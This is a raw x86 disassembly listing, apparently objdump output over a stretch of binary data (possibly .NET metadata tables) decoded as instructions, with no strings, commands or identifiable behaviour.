  4075b0:	80 00 01             	addb   $0x1,(%eax)
  4075b3:	00 72 01             	add    %dh,0x1(%edx)
  4075b6:	87 00                	xchg   %eax,(%eax)
  4075b8:	01 00                	add    %eax,(%eax)
  4075ba:	8c 02                	mov    %es,(%edx)
  4075bc:	8f 00                	pop    (%eax)
  4075be:	06                   	push   %es
  4075bf:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4075c2:	71 00                	jno    0x4075c4
  4075c4:	06                   	push   %es
  4075c5:	00 aa 12 5e 01 06    	add    %ch,0x6015e12(%edx)
  4075cb:	00 e0                	add    %ah,%al
  4075cd:	15 78 00 06 00       	adc    $0x60078,%eax
  4075d2:	e0 09                	loopne 0x4075dd
  4075d4:	71 00                	jno    0x4075d6
  4075d6:	06                   	push   %es
  4075d7:	00 2c 17             	add    %ch,(%edi,%edx,1)
  4075da:	ea 00 06 00 b8 07 71 	ljmp   $0x7107,$0xb8000600
  4075e1:	00 01                	add    %al,(%ecx)
  4075e3:	00 6b 02             	add    %ch,0x2(%ebx)
  4075e6:	66 01 01             	add    %ax,(%ecx)
  4075e9:	00 c9                	add    %cl,%cl
  4075eb:	02 78 00             	add    0x0(%eax),%bh
  4075ee:	01 00                	add    %eax,(%eax)
  4075f0:	72 01                	jb     0x4075f3
  4075f2:	96                   	xchg   %eax,%esi
  4075f3:	00 01                	add    %al,(%ecx)
  4075f5:	00 8c 02 d4 00 01 00 	add    %cl,0x100d4(%edx,%eax,1)
  4075fc:	36 03 8f 00 06 00 2c 	add    %ss:0x2c000600(%edi),%ecx
  407603:	0a 71 00             	or     0x0(%ecx),%dh
  407606:	06                   	push   %es
  407607:	00 aa 12 6a 01 06    	add    %ch,0x6016a12(%edx)
  40760d:	00 e0                	add    %ah,%al
  40760f:	15 78 00 01 00       	adc    $0x10078,%eax
  407614:	72 01                	jb     0x407617
  407616:	96                   	xchg   %eax,%esi
  407617:	00 06                	add    %al,(%esi)
  407619:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  40761c:	71 00                	jno    0x40761e
  40761e:	06                   	push   %es
  40761f:	00 aa 12 6e 01 06    	add    %ch,0x6016e12(%edx)
  407625:	00 e0                	add    %ah,%al
  407627:	15 78 00 01 00       	adc    $0x10078,%eax
  40762c:	72 01                	jb     0x40762f
  40762e:	87 00                	xchg   %eax,(%eax)
  407630:	06                   	push   %es
  407631:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407634:	71 00                	jno    0x407636
  407636:	06                   	push   %es
  407637:	00 aa 12 57 01 06    	add    %ch,0x6015712(%edx)
  40763d:	00 e0                	add    %ah,%al
  40763f:	15 78 00 06 00       	adc    $0x60078,%eax
  407644:	67 06                	addr16 push %es
  407646:	80 00 01             	addb   $0x1,(%eax)
  407649:	00 72 01             	add    %dh,0x1(%edx)
  40764c:	8f 00                	pop    (%eax)
  40764e:	06                   	push   %es
  40764f:	00 78 07             	add    %bh,0x7(%eax)
  407652:	76 01                	jbe    0x407655
  407654:	06                   	push   %es
  407655:	00 02                	add    %al,(%edx)
  407657:	0d 71 00 06 00       	or     $0x60071,%eax
  40765c:	66 17                	popw   %ss
  40765e:	71 00                	jno    0x407660
  407660:	06                   	push   %es
  407661:	00 d6                	add    %dl,%dh
  407663:	0e                   	push   %cs
  407664:	66 01 06             	add    %ax,(%esi)
  407667:	00 42 1a             	add    %al,0x1a(%edx)
  40766a:	80 00 01             	addb   $0x1,(%eax)
  40766d:	00 f6                	add    %dh,%dh
  40766f:	18 71 00             	sbb    %dh,0x0(%ecx)
  407672:	36 00 80 05 a7 01 16 	add    %al,%ss:0x1601a705(%eax)
  407679:	00 8a 00 ab 01 06    	add    %cl,0x601ab00(%edx)
  40767f:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407682:	71 00                	jno    0x407684
  407684:	06                   	push   %es
  407685:	00 aa 12 6e 01 06    	add    %ch,0x6016e12(%edx)
  40768b:	00 e0                	add    %ah,%al
  40768d:	15 fa 00 01 00       	adc    $0x100fa,%eax
  407692:	72 01                	jb     0x407695
  407694:	87 00                	xchg   %eax,(%eax)
  407696:	06                   	push   %es
  407697:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  40769a:	71 00                	jno    0x40769c
  40769c:	06                   	push   %es
  40769d:	00 aa 12 6e 01 06    	add    %ch,0x6016e12(%edx)
  4076a3:	00 80 0d 71 00 06    	add    %al,0x600710d(%eax)
  4076a9:	00 e0                	add    %ah,%al
  4076ab:	15 fa 00 01 00       	adc    $0x100fa,%eax
  4076b0:	1d 02 80 00 01       	sbb    $0x1008002,%eax
  4076b5:	00 d3                	add    %dl,%bl
  4076b7:	02 71 00             	add    0x0(%ecx),%dh
  4076ba:	01 00                	add    %eax,(%eax)
  4076bc:	ad                   	lods   %ds:(%esi),%eax
  4076bd:	03 71 00             	add    0x0(%ecx),%esi
  4076c0:	01 00                	add    %eax,(%eax)
  4076c2:	12 04 c6             	adc    (%esi,%eax,8),%al
  4076c5:	01 01                	add    %eax,(%ecx)
  4076c7:	00 7a 04             	add    %bh,0x4(%edx)
  4076ca:	c6 01 01             	movb   $0x1,(%ecx)
  4076cd:	00 72 01             	add    %dh,0x1(%edx)
  4076d0:	ca 01 01             	lret   $0x101
  4076d3:	00 8c 02 96 00 06 00 	add    %cl,0x60096(%edx,%eax,1)
  4076da:	2c 0a                	sub    $0xa,%al
  4076dc:	71 00                	jno    0x4076de
  4076de:	06                   	push   %es
  4076df:	00 aa 12 6e 01 06    	add    %ch,0x6016e12(%edx)
  4076e5:	00 80 0d 71 00 06    	add    %al,0x600710d(%eax)
  4076eb:	00 e0                	add    %ah,%al
  4076ed:	15 fa 00 01 00       	adc    $0x100fa,%eax
  4076f2:	1d 02 80 00 01       	sbb    $0x1008002,%eax
  4076f7:	00 d3                	add    %dl,%bl
  4076f9:	02 71 00             	add    0x0(%ecx),%dh
  4076fc:	01 00                	add    %eax,(%eax)
  4076fe:	ad                   	lods   %ds:(%esi),%eax
  4076ff:	03 71 00             	add    0x0(%ecx),%esi
  407702:	01 00                	add    %eax,(%eax)
  407704:	72 01                	jb     0x407707
  407706:	ca 01 06             	lret   $0x601
  407709:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  40770c:	71 00                	jno    0x40770e
  40770e:	06                   	push   %es
  40770f:	00 aa 12 57 01 06    	add    %ch,0x6015712(%edx)
  407715:	00 67 06             	add    %ah,0x6(%edi)
  407718:	80 00 06             	addb   $0x6,(%eax)
  40771b:	00 e0                	add    %ah,%al
  40771d:	15 fa 00 01 00       	adc    $0x100fa,%eax
  407722:	72 01                	jb     0x407725
  407724:	ca 01 11             	lret   $0x1101
  407727:	00 41 14             	add    %al,0x14(%ecx)
  40772a:	78 00                	js     0x40772c
  40772c:	11 00                	adc    %eax,(%eax)
  40772e:	e5 13                	in     $0x13,%eax
  407730:	7c 00                	jl     0x407732
  407732:	11 00                	adc    %eax,(%eax)
  407734:	e0 11                	loopne 0x407747
  407736:	5f                   	pop    %edi
  407737:	00 11                	add    %dl,(%ecx)
  407739:	00 96 18 71 00 11    	add    %dl,0x11007118(%esi)
  40773f:	00 42 1a             	add    %al,0x1a(%edx)
  407742:	80 00 11             	addb   $0x11,(%eax)
  407745:	00 fc                	add    %bh,%ah
  407747:	19 71 00             	sbb    %esi,0x0(%ecx)
  40774a:	11 00                	adc    %eax,(%eax)
  40774c:	ff 0d 5f 00 11 00    	decl   0x11005f
  407752:	09 12                	or     %edx,(%edx)
  407754:	71 00                	jno    0x407756
  407756:	11 00                	adc    %eax,(%eax)
  407758:	4e                   	dec    %esi
  407759:	0e                   	push   %cs
  40775a:	5f                   	pop    %edi
  40775b:	00 11                	add    %dl,(%ecx)
  40775d:	00 33                	add    %dh,(%ebx)
  40775f:	09 5f 00             	or     %ebx,0x0(%edi)
  407762:	16                   	push   %ss
  407763:	00 16                	add    %dl,(%esi)
  407765:	0e                   	push   %cs
  407766:	d1 01                	roll   $1,(%ecx)
  407768:	06                   	push   %es
  407769:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  40776c:	71 00                	jno    0x40776e
  40776e:	06                   	push   %es
  40776f:	00 aa 12 74 00 01    	add    %ch,0x1007412(%edx)
  407775:	00 72 01             	add    %dh,0x1(%edx)
  407778:	96                   	xchg   %eax,%esi
  407779:	00 01                	add    %al,(%ecx)
  40777b:	00 8c 02 8f 00 01 00 	add    %cl,0x1008f(%edx,%eax,1)
  407782:	de 01                	fiadds (%ecx)
  407784:	84 00                	test   %al,(%eax)
  407786:	01 00                	add    %eax,(%eax)
  407788:	aa                   	stos   %al,%es:(%edi)
  407789:	02 71 00             	add    0x0(%ecx),%dh
  40778c:	01 00                	add    %eax,(%eax)
  40778e:	a0 03 66 01 01       	mov    0x1016603,%al
  407793:	00 36                	add    %dh,(%esi)
  407795:	03 d4                	add    %esp,%edx
  407797:	00 01                	add    %al,(%ecx)
  407799:	00 0a                	add    %cl,(%edx)
  40779b:	04 9a                	add    $0x9a,%al
  40779d:	00 21                	add    %ah,(%ecx)
  40779f:	00 b0 18 ef 01 06    	add    %dh,0x601ef18(%eax)
  4077a5:	00 c6                	add    %al,%dh
  4077a7:	0c a6                	or     $0xa6,%al
  4077a9:	02 06                	add    (%esi),%al
  4077ab:	00 55 09             	add    %dl,0x9(%ebp)
  4077ae:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4077af:	02 36                	add    (%esi),%dh
  4077b1:	00 80 05 a9 02 16    	add    %al,0x1602a905(%eax)
  4077b7:	00 b8 00 ae 02 16    	add    %bh,0x1602ae00(%eax)
  4077bd:	00 50 00             	add    %dl,0x0(%eax)
  4077c0:	b5 02                	mov    $0x2,%ch
  4077c2:	06                   	push   %es
  4077c3:	00 3f                	add    %bh,(%edi)
  4077c5:	0e                   	push   %cs
  4077c6:	5f                   	pop    %edi
  4077c7:	00 06                	add    %al,(%esi)
  4077c9:	00 3b                	add    %bh,(%ebx)
  4077cb:	09 5f 00             	or     %ebx,0x0(%edi)
  4077ce:	06                   	push   %es
  4077cf:	00 3f                	add    %bh,(%edi)
  4077d1:	0e                   	push   %cs
  4077d2:	5f                   	pop    %edi
  4077d3:	00 06                	add    %al,(%esi)
  4077d5:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4077d8:	71 00                	jno    0x4077da
  4077da:	06                   	push   %es
  4077db:	00 aa 12 57 01 06    	add    %ch,0x6015712(%edx)
  4077e1:	00 3f                	add    %bh,(%edi)
  4077e3:	0e                   	push   %cs
  4077e4:	5f                   	pop    %edi
  4077e5:	00 06                	add    %al,(%esi)
  4077e7:	00 3b                	add    %bh,(%ebx)
  4077e9:	09 5f 00             	or     %ebx,0x0(%edi)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	28 02                	sub    %al,(%edx)
  4077f0:	5f                   	pop    %edi
  4077f1:	00 01                	add    %al,(%ecx)
  4077f3:	00 ff                	add    %bh,%bh
  4077f5:	02 c0                	add    %al,%al
  4077f7:	02 01                	add    (%ecx),%al
  4077f9:	00 72 01             	add    %dh,0x1(%edx)
  4077fc:	96                   	xchg   %eax,%esi
  4077fd:	00 06                	add    %al,(%esi)
  4077ff:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407802:	71 00                	jno    0x407804
  407804:	06                   	push   %es
  407805:	00 aa 12 57 01 06    	add    %ch,0x6015712(%edx)
  40780b:	00 3b                	add    %bh,(%ebx)
  40780d:	09 5f 00             	or     %ebx,0x0(%edi)
  407810:	06                   	push   %es
  407811:	00 3f                	add    %bh,(%edi)
  407813:	0e                   	push   %cs
  407814:	5f                   	pop    %edi
  407815:	00 01                	add    %al,(%ecx)
  407817:	00 72 01             	add    %dh,0x1(%edx)
  40781a:	8f 00                	pop    (%eax)
  40781c:	06                   	push   %es
  40781d:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407820:	71 00                	jno    0x407822
  407822:	06                   	push   %es
  407823:	00 aa 12 5e 01 06    	add    %ch,0x6015e12(%edx)
  407829:	00 d6                	add    %dl,%dh
  40782b:	0e                   	push   %cs
  40782c:	66 01 06             	add    %ax,(%esi)
  40782f:	00 68 1a             	add    %ch,0x1a(%eax)
  407832:	80 00 06             	addb   $0x6,(%eax)
  407835:	00 2c 17             	add    %ch,(%edi,%edx,1)
  407838:	ea 00 06 00 e0 09 71 	ljmp   $0x7109,$0xe0000600
  40783f:	00 06                	add    %al,(%esi)
  407841:	00 19                	add    %bl,(%ecx)
  407843:	06                   	push   %es
  407844:	71 00                	jno    0x407846
  407846:	01 00                	add    %eax,(%eax)
  407848:	55                   	push   %ebp
  407849:	02 78 00             	add    0x0(%eax),%bh
  40784c:	01 00                	add    %eax,(%eax)
  40784e:	72 01                	jb     0x407851
  407850:	8f 00                	pop    (%eax)
  407852:	06                   	push   %es
  407853:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407856:	71 00                	jno    0x407858
  407858:	06                   	push   %es
  407859:	00 aa 12 c4 02 01    	add    %ch,0x102c412(%edx)
  40785f:	00 72 01             	add    %dh,0x1(%edx)
  407862:	dc 00                	faddl  (%eax)
  407864:	06                   	push   %es
  407865:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407868:	71 00                	jno    0x40786a
  40786a:	06                   	push   %es
  40786b:	00 aa 12 cb 02 01    	add    %ch,0x102cb12(%edx)
  407871:	00 72 01             	add    %dh,0x1(%edx)
  407874:	e3 00                	jecxz  0x407876
  407876:	06                   	push   %es
  407877:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  40787a:	71 00                	jno    0x40787c
  40787c:	06                   	push   %es
  40787d:	00 aa 12 74 00 06    	add    %ch,0x6007412(%edx)
  407883:	00 3f                	add    %bh,(%edi)
  407885:	0e                   	push   %cs
  407886:	5f                   	pop    %edi
  407887:	00 01                	add    %al,(%ecx)
  407889:	00 72 01             	add    %dh,0x1(%edx)
  40788c:	96                   	xchg   %eax,%esi
  40788d:	00 06                	add    %al,(%esi)
  40788f:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407892:	71 00                	jno    0x407894
  407894:	06                   	push   %es
  407895:	00 aa 12 74 00 01    	add    %ch,0x1007412(%edx)
  40789b:	00 72 01             	add    %dh,0x1(%edx)
  40789e:	96                   	xchg   %eax,%esi
  40789f:	00 33                	add    %dh,(%ebx)
  4078a1:	01 4e 03             	add    %ecx,0x3(%esi)
  4078a4:	d2 02                	rolb   %cl,(%edx)
  4078a6:	33 01                	xor    (%ecx),%eax
  4078a8:	d6                   	salc
  4078a9:	05 d7 02 00 00       	add    $0x2d7,%eax
  4078ae:	00 00                	add    %al,(%eax)
  4078b0:	80 00 91             	addb   $0x91,(%eax)
  4078b3:	20 e3                	and    %ah,%bl
  4078b5:	0c 13                	or     $0x13,%al
  4078b7:	00 01                	add    %al,(%ecx)
  4078b9:	00 00                	add    %al,(%eax)
  4078bb:	00 00                	add    %al,(%eax)
  4078bd:	00 80 00 91 20 55    	add    %al,0x55209100(%eax)
  4078c3:	13 1c 00             	adc    (%eax,%eax,1),%ebx
  4078c6:	04 00                	add    $0x0,%al
  4078c8:	00 00                	add    %al,(%eax)
  4078ca:	00 00                	add    %al,(%eax)
  4078cc:	80 00 91             	addb   $0x91,(%eax)
  4078cf:	20 43 13             	and    %al,0x13(%ebx)
  4078d2:	29 00                	sub    %eax,(%eax)
  4078d4:	0a 00                	or     (%eax),%al
  4078d6:	00 00                	add    %al,(%eax)
  4078d8:	00 00                	add    %al,(%eax)
  4078da:	80 00 91             	addb   $0x91,(%eax)
  4078dd:	20 2c 07             	and    %ch,(%edi,%eax,1)
  4078e0:	38 00                	cmp    %al,(%eax)
  4078e2:	12 00                	adc    (%eax),%al
  4078e4:	00 00                	add    %al,(%eax)
  4078e6:	00 00                	add    %al,(%eax)
  4078e8:	80 00 91             	addb   $0x91,(%eax)
  4078eb:	20 36                	and    %dh,(%esi)
  4078ed:	08 3e                	or     %bh,(%esi)
  4078ef:	00 14 00             	add    %dl,(%eax,%eax,1)
  4078f2:	d0 23                	shlb   $1,(%ebx)
  4078f4:	00 00                	add    %al,(%eax)
  4078f6:	00 00                	add    %al,(%eax)
  4078f8:	96                   	xchg   %eax,%esi
  4078f9:	00 70 16             	add    %dh,0x16(%eax)
  4078fc:	43                   	inc    %ebx
  4078fd:	00 15 00 44 24 00    	add    %dl,0x244400
  407903:	00 00                	add    %al,(%eax)
  407905:	00 96 00 79 16 4a    	add    %dl,0x4a167900(%esi)
  40790b:	00 16                	add    %dl,(%esi)
  40790d:	00 78 20             	add    %bh,0x20(%eax)
  407910:	00 00                	add    %al,(%eax)
  407912:	00 00                	add    %al,(%eax)
  407914:	86 18                	xchg   %bl,(%eax)
  407916:	7b 14                	jnp    0x40792c
  407918:	52                   	push   %edx
  407919:	00 18                	add    %bl,(%eax)
  40791b:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  407921:	00 86 18 7b 14 52    	add    %al,0x52147b18(%esi)
  407927:	00 18                	add    %bl,(%eax)
  407929:	00 6c 24 00          	add    %ch,0x0(%esp)
  40792d:	00 00                	add    %al,(%eax)
  40792f:	00 86 00 89 13 62    	add    %al,0x62138900(%esi)
  407935:	00 18                	add    %bl,(%eax)
  407937:	00 b4 20 00 00 00 00 	add    %dh,0x0(%eax,%eiz,1)
  40793e:	91                   	xchg   %eax,%ecx
  40793f:	00 8d 0c 69 00 19    	add    %cl,0x1900690c(%ebp)
  407945:	00 b8 24 00 00 00    	add    %bh,0x24(%eax)
  40794b:	00 e1                	add    %ah,%cl
  40794d:	01 56 19             	add    %edx,0x19(%esi)
  407950:	52                   	push   %edx
  407951:	00 1b                	add    %bl,(%ebx)
  407953:	00 d9                	add    %bl,%cl
  407955:	20 00                	and    %al,(%eax)
  407957:	00 00                	add    %al,(%eax)
  407959:	00 e1                	add    %ah,%cl
  40795b:	01 90 09 9e 00 1b    	add    %edx,0x1b009e09(%eax)
  407961:	00 84 29 00 00 00 00 	add    %al,0x0(%ecx,%ebp,1)
  407968:	96                   	xchg   %eax,%esi
  407969:	00 80 18 a4 00 1c    	add    %al,0x1c00a418(%eax)
  40796f:	00 44 2a 00          	add    %al,0x0(%edx,%ebp,1)
  407973:	00 00                	add    %al,(%eax)
  407975:	00 96 00 78 18 a4    	add    %dl,-0x5be78800(%esi)
  40797b:	00 1e                	add    %bl,(%esi)
  40797d:	00 78 20             	add    %bh,0x20(%eax)
  407980:	00 00                	add    %al,(%eax)
  407982:	00 00                	add    %al,(%eax)
  407984:	86 18                	xchg   %bl,(%eax)
  407986:	7b 14                	jnp    0x40799c
  407988:	52                   	push   %edx
  407989:	00 20                	add    %ah,(%eax)
  40798b:	00 e7                	add    %ah,%bh
  40798d:	20 00                	and    %al,(%eax)
  40798f:	00 00                	add    %al,(%eax)
  407991:	00 86 18 7b 14 ad    	add    %al,-0x52eb84e8(%esi)
  407997:	00 20                	add    %ah,(%eax)
  407999:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  40799c:	00 00                	add    %al,(%eax)
  40799e:	00 00                	add    %al,(%eax)
  4079a0:	86 00                	xchg   %al,(%eax)
  4079a2:	b7 0e                	mov    $0xe,%bh
  4079a4:	b5 00                	mov    $0x0,%ch
  4079a6:	22 00                	and    (%eax),%al
  4079a8:	fd                   	std
  4079a9:	20 00                	and    %al,(%eax)
  4079ab:	00 00                	add    %al,(%eax)
  4079ad:	00 81 00 2c 17 bc    	add    %al,-0x43e8d400(%ecx)
  4079b3:	00 23                	add    %ah,(%ebx)
  4079b5:	00 50 2b             	add    %dl,0x2b(%eax)
  4079b8:	00 00                	add    %al,(%eax)
  4079ba:	00 00                	add    %al,(%eax)
  4079bc:	81 00 6f 11 62 00    	addl   $0x62116f,(%eax)
  4079c2:	24 00                	and    $0x0,%al
  4079c4:	94                   	xchg   %eax,%esp
  4079c5:	2b 00                	sub    (%eax),%eax
  4079c7:	00 00                	add    %al,(%eax)
  4079c9:	00 86 00 52 0c c2    	add    %al,-0x3df3ae00(%esi)
  4079cf:	00 25 00 d8 2b 00    	add    %ah,0x2bd800
  4079d5:	00 00                	add    %al,(%eax)
  4079d7:	00 86 00 5f 0c 62    	add    %al,0x620c5f00(%esi)
  4079dd:	00 25 00 24 2c 00    	add    %ah,0x2c2400
  4079e3:	00 00                	add    %al,(%eax)
  4079e5:	00 81 00 50 07 c7    	add    %al,-0x38f8b000(%ecx)
  4079eb:	00 26                	add    %ah,(%esi)
  4079ed:	00 70 2c             	add    %dh,0x2c(%eax)
  4079f0:	00 00                	add    %al,(%eax)
  4079f2:	00 00                	add    %al,(%eax)
  4079f4:	86 00                	xchg   %al,(%eax)
  4079f6:	6c                   	insb   (%dx),%es:(%edi)
  4079f7:	0c 62                	or     $0x62,%al
  4079f9:	00 28                	add    %ch,(%eax)
  4079fb:	00 bc 2c 00 00 00 00 	add    %bh,0x0(%esp,%ebp,1)
  407a02:	86 00                	xchg   %al,(%eax)
  407a04:	8b 19                	mov    (%ecx),%ebx
  407a06:	c7 00 29 00 10 2d    	movl   $0x2d100029,(%eax)
  407a0c:	00 00                	add    %al,(%eax)
  407a0e:	00 00                	add    %al,(%eax)
  407a10:	86 00                	xchg   %al,(%eax)
  407a12:	89 11                	mov    %edx,(%ecx)
  407a14:	62 00                	bound  %eax,(%eax)
  407a16:	2b 00                	sub    (%eax),%eax
  407a18:	54                   	push   %esp
  407a19:	2d 00 00 00 00       	sub    $0x0,%eax
  407a1e:	e1 01                	loope  0x407a21
  407a20:	56                   	push   %esi
  407a21:	19 52 00             	sbb    %edx,0x0(%edx)
  407a24:	2c 00                	sub    $0x0,%al
  407a26:	ff 20                	jmp    *(%eax)
  407a28:	00 00                	add    %al,(%eax)
  407a2a:	00 00                	add    %al,(%eax)
  407a2c:	e1 01                	loope  0x407a2f
  407a2e:	90                   	nop
  407a2f:	09 9e 00 2c 00 94    	or     %ebx,-0x6bffd400(%esi)
  407a35:	2f                   	das
  407a36:	00 00                	add    %al,(%eax)
  407a38:	00 00                	add    %al,(%eax)
  407a3a:	e1 01                	loope  0x407a3d
  407a3c:	56                   	push   %esi
  407a3d:	19 52 00             	sbb    %edx,0x0(%edx)
  407a40:	2d 00 0d 21 00       	sub    $0x210d00,%eax
  407a45:	00 00                	add    %al,(%eax)
  407a47:	00 e1                	add    %ah,%cl
  407a49:	01 90 09 9e 00 2d    	add    %edx,0x2d009e09(%eax)
  407a4f:	00 ec                	add    %ch,%ah
  407a51:	31 00                	xor    %eax,(%eax)
  407a53:	00 00                	add    %al,(%eax)
  407a55:	00 e1                	add    %ah,%cl
  407a57:	01 56 19             	add    %edx,0x19(%esi)
  407a5a:	52                   	push   %edx
  407a5b:	00 2e                	add    %ch,(%esi)
  407a5d:	00 1b                	add    %bl,(%ebx)
  407a5f:	21 00                	and    %eax,(%eax)
  407a61:	00 00                	add    %al,(%eax)
  407a63:	00 e1                	add    %ah,%cl
  407a65:	01 90 09 9e 00 2e    	add    %edx,0x2e009e09(%eax)
  407a6b:	00 60 33             	add    %ah,0x33(%eax)
  407a6e:	00 00                	add    %al,(%eax)
  407a70:	00 00                	add    %al,(%eax)
  407a72:	e1 01                	loope  0x407a75
  407a74:	56                   	push   %esi
  407a75:	19 52 00             	sbb    %edx,0x0(%edx)
  407a78:	2f                   	das
  407a79:	00 29                	add    %ch,(%ecx)
  407a7b:	21 00                	and    %eax,(%eax)
  407a7d:	00 00                	add    %al,(%eax)
  407a7f:	00 e1                	add    %ah,%cl
  407a81:	01 90 09 9e 00 2f    	add    %edx,0x2f009e09(%eax)
  407a87:	00 34 35 00 00 00 00 	add    %dh,0x0(,%esi,1)
  407a8e:	e1 01                	loope  0x407a91
  407a90:	56                   	push   %esi
  407a91:	19 52 00             	sbb    %edx,0x0(%edx)
  407a94:	30 00                	xor    %al,(%eax)
  407a96:	37                   	aaa
  407a97:	21 00                	and    %eax,(%eax)
  407a99:	00 00                	add    %al,(%eax)
  407a9b:	00 e1                	add    %ah,%cl
  407a9d:	01 90 09 9e 00 30    	add    %edx,0x30009e09(%eax)
  407aa3:	00 50 37             	add    %dl,0x37(%eax)
  407aa6:	00 00                	add    %al,(%eax)
  407aa8:	00 00                	add    %al,(%eax)
  407aaa:	e1 01                	loope  0x407aad
  407aac:	56                   	push   %esi
  407aad:	19 52 00             	sbb    %edx,0x0(%edx)
  407ab0:	31 00                	xor    %eax,(%eax)
  407ab2:	45                   	inc    %ebp
  407ab3:	21 00                	and    %eax,(%eax)
  407ab5:	00 00                	add    %al,(%eax)
  407ab7:	00 e1                	add    %ah,%cl
  407ab9:	01 90 09 9e 00 31    	add    %edx,0x31009e09(%eax)
  407abf:	00 f8                	add    %bh,%al
  407ac1:	39 00                	cmp    %eax,(%eax)
  407ac3:	00 00                	add    %al,(%eax)
  407ac5:	00 e1                	add    %ah,%cl
  407ac7:	01 56 19             	add    %edx,0x19(%esi)
  407aca:	52                   	push   %edx
  407acb:	00 32                	add    %dh,(%edx)
  407acd:	00 53 21             	add    %dl,0x21(%ebx)
  407ad0:	00 00                	add    %al,(%eax)
  407ad2:	00 00                	add    %al,(%eax)
  407ad4:	e1 01                	loope  0x407ad7
  407ad6:	90                   	nop
  407ad7:	09 9e 00 32 00 d8    	or     %ebx,-0x27ffce00(%esi)
  407add:	3c 00                	cmp    $0x0,%al
  407adf:	00 00                	add    %al,(%eax)
  407ae1:	00 e1                	add    %ah,%cl
  407ae3:	01 56 19             	add    %edx,0x19(%esi)
  407ae6:	52                   	push   %edx
  407ae7:	00 33                	add    %dh,(%ebx)
  407ae9:	00 61 21             	add    %ah,0x21(%ecx)
  407aec:	00 00                	add    %al,(%eax)
  407aee:	00 00                	add    %al,(%eax)
  407af0:	e1 01                	loope  0x407af3
  407af2:	90                   	nop
  407af3:	09 9e 00 33 00 00    	or     %ebx,0x3300(%esi)
  407af9:	00 00                	add    %al,(%eax)
  407afb:	00 80 00 91 20 f4    	add    %al,-0xbdf6f00(%eax)
  407b01:	11 fe                	adc    %edi,%esi
  407b03:	00 34 00             	add    %dh,(%eax,%eax,1)
  407b06:	6f                   	outsl  %ds:(%esi),(%dx)
  407b07:	21 00                	and    %eax,(%eax)
  407b09:	00 00                	add    %al,(%eax)
  407b0b:	00 86 18 7b 14 07    	add    %al,0x7147b18(%esi)
  407b11:	01 37                	add    %esi,(%edi)
  407b13:	00 a5 21 00 00 00    	add    %ah,0x21(%ebp)
  407b19:	00 86 00 15 08 bc    	add    %al,-0x43f7eb00(%esi)
  407b1f:	00 39                	add    %bh,(%ecx)
  407b21:	00 b8 3d 00 00 00    	add    %bh,0x3d(%eax)
  407b27:	00 86 00 3e 17 52    	add    %al,0x52173e00(%esi)
  407b2d:	00 3a                	add    %bh,(%edx)
  407b2f:	00 f0                	add    %dh,%al
  407b31:	3d 00 00 00 00       	cmp    $0x0,%eax
  407b36:	86 00                	xchg   %al,(%eax)
  407b38:	ce                   	into
  407b39:	06                   	push   %es
  407b3a:	13 01                	adc    (%ecx),%eax
  407b3c:	3a 00                	cmp    (%eax),%al
  407b3e:	4c                   	dec    %esp
  407b3f:	3e 00 00             	add    %al,%ds:(%eax)
  407b42:	00 00                	add    %al,(%eax)
  407b44:	86 00                	xchg   %al,(%eax)
  407b46:	87 07                	xchg   %eax,(%edi)
  407b48:	29 01                	sub    %eax,(%ecx)
  407b4a:	3d 00 84 3e 00       	cmp    $0x3e8400,%eax
  407b4f:	00 00                	add    %al,(%eax)
  407b51:	00 86 00 c1 06 2d    	add    %al,0x2d06c100(%esi)
  407b57:	01 3d 00 c8 3e 00    	add    %edi,0x3ec800
  407b5d:	00 00                	add    %al,(%eax)
  407b5f:	00 86 00 94 06 36    	add    %al,0x36069400(%esi)
  407b65:	01 3d 00 b3 21 00    	add    %edi,0x21b300
  407b6b:	00 00                	add    %al,(%eax)
  407b6d:	00 81 00 e5 09 40    	add    %al,0x4009e500(%ecx)
  407b73:	01 3e                	add    %edi,(%esi)
  407b75:	00 cd                	add    %cl,%ch
  407b77:	21 00                	and    %eax,(%eax)
  407b79:	00 00                	add    %al,(%eax)
  407b7b:	00 86 00 d6 18 48    	add    %al,0x4818d600(%esi)
  407b81:	01 40 00             	add    %eax,0x0(%eax)
  407b84:	db 21                	(bad) (%ecx)
  407b86:	00 00                	add    %al,(%eax)
  407b88:	00 00                	add    %al,(%eax)
  407b8a:	86 00                	xchg   %al,(%eax)
  407b8c:	e5 18                	in     $0x18,%eax
  407b8e:	52                   	push   %edx
  407b8f:	00 41 00             	add    %al,0x0(%ecx)
  407b92:	14 3f                	adc    $0x3f,%al
  407b94:	00 00                	add    %al,(%eax)
  407b96:	00 00                	add    %al,(%eax)
  407b98:	86 00                	xchg   %al,(%eax)
  407b9a:	af                   	scas   %es:(%edi),%eax
  407b9b:	06                   	push   %es
  407b9c:	4d                   	dec    %ebp
  407b9d:	01 41 00             	add    %eax,0x0(%ecx)
  407ba0:	68 3f 00 00 00       	push   $0x3f
  407ba5:	00 e1                	add    %ah,%cl
  407ba7:	01 56 19             	add    %edx,0x19(%esi)
  407baa:	52                   	push   %edx
  407bab:	00 43 00             	add    %al,0x0(%ebx)
  407bae:	e8 21 00 00 00       	call   0x407bd4
  407bb3:	00 e1                	add    %ah,%cl
  407bb5:	01 90 09 9e 00 43    	add    %edx,0x43009e09(%eax)
  407bbb:	00 3c 43             	add    %bh,(%ebx,%eax,2)
  407bbe:	00 00                	add    %al,(%eax)
  407bc0:	00 00                	add    %al,(%eax)
  407bc2:	e1 01                	loope  0x407bc5
  407bc4:	56                   	push   %esi
  407bc5:	19 52 00             	sbb    %edx,0x0(%edx)
  407bc8:	44                   	inc    %esp
  407bc9:	00 f6                	add    %dh,%dh
  407bcb:	21 00                	and    %eax,(%eax)
  407bcd:	00 00                	add    %al,(%eax)
